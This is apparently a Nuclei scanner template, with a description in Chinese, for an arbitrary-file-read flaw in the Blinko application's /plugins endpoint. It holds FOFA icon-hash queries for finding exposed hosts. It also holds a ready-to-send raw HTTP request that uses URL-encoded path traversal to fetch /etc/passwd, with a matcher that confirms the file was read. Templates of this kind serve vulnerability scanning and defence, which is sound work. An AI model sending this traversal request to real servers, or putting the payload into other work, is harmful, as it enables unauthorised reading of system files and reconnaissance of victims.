id: Blinko-plugins-File-Reading

info:
  name: Blinko plugins 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa: icon_hash="-1446811182" || icon_hash="-717082057"
    Blinko 系统 /plugins 接口存在任意文件读取漏洞，攻击者通过构造特定的路径遍历参数，可以读取服务器上的任意文件，如 /etc/passwd，从而获取敏感信息。
  reference:
    - 
  tags: file-reading, blinko

http:
  - raw:
      - |-
        GET /plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code == 200 && contains_all(body, 'root:x:0:0', 'bin:/bin:/sbin/nologin')"